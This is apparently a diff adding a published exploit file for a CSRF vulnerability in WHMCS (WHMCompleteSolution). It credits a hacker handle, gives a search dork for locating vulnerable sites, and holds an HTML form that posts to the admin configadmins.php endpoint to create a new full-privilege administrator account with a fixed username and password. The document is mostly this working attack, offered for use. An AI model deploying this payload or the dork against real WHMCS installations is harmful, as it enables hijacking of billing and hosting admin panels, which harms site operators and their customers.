@@ -1,0 +1,33 @@
+WHMC CSRF Vulnerability (Add Admin)
+====================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST  [F.Hack@w.cn]
+.:. Script         : http://www.whmcs.com/
+.:. Dork           : "Powered by WHMCompleteSolution"
+.:. Home           : www.Hack-Book.com
+.:. Gr34T$ T0 [h1ch4m] & [Risky] & [ZaIdOoHxHaCkEr] & [The Sword]
+
+####################################################################
+
+===[ Exploit ]===
+<html>
+<head>
+<title>WHMCompleteSolution [Add Admin]</title>
+</head>
+<H2>CSRF Add Admin By AtT4CKxT3rR0r1ST</H2>
+<form method="POST" name="form0" action="http://localhost/AdminPath/configadmins.php?action=addnow">
+<input type="hidden" name="roleid" value="1"/>
+<input type="hidden" name="firstname" value="Mohammad"/>
+<input type="hidden" name="lastname" value="Hussien"/>
+<input type="hidden" name="email" value="f.hack@w.cn"/>
+<input type="hidden" name="username" value="Admin"/>
+<input type="hidden" name="password" value="123456"/>
+<input type="hidden" name="password2" value="123456"/>
+<input type="hidden" name="signature" value="Iam Palestinian"/>
+<input type="hidden" name="notes" value="Iam Palestinian"/>
+</form>
+
+</body>
+</html>
+#################################################################### 		 	   		  
